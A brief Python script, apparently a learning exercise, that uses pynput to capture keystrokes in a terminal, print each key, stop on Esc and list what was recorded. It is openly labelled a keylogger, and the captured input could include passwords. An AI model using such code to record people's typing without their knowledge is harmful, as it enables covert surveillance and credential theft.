# Disable - Enable Privacy Input Monitoring and Accessibility for Terminal 
# https://pypi.org/project/pynput/ LIBRARY
from pynput.keyboard import Key, Listener

print("""
jhyungleeCS | mangoclient keylogger
FOR LEARNING PURPOSES ONLY!
Logging KeyStrokes ~: 
""") 


keylog = []
keylog_class = []
stop_listening = False 


def on_press(key):
    global stop_listening

    try:
        if key.char.isdigit():
            keylog.append(int(key.char))
            keylog_class.append(int(key.char))
        else:
            keylog.append(key.char)
            keylog_class.append(key.char)
        print('Key {} pressed.'.format(key.char))
    except AttributeError:
        keylog.append(str(key))
        keylog_class.append(str(key))
        print('Key {} pressed.'.format(key))
    if key == Key.esc:
        stop_listening = True 


def on_release(key): 
    pass

#Start
with Listener(on_press=on_press, on_release=on_release) as listener:
    while not stop_listening: 
        pass

    listener.stop()

for x in keylog: 
    keylog_class.append(type(x))



print("KeyLog: ", keylog)
print("KeyLog Class Recorded Type with Element Value")
